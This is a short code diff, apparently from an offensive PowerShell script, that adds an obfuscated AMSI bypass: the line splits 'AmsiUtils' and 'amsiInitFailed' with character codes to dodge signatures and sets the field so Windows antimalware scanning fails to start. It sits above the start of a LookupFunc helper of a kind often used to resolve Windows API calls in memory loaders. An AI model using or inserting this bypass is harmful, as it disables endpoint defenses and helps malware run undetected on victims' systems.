@@ -1,3 +1,6 @@
+# PowerShell: AMSI bypass - Trys to assign the AMSI scan function a boolean 'True' value so AMSI initialization fails
+[Ref].Assembly.GetType('System.Management.Automation.Amsi'+[char]85+'tils').GetField('ams'+[char]105+'InitFailed','NonPublic,Static').SetValue($null,$true)
+
 function LookupFunc {
     Param ($moduleName, $functionName)
     $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
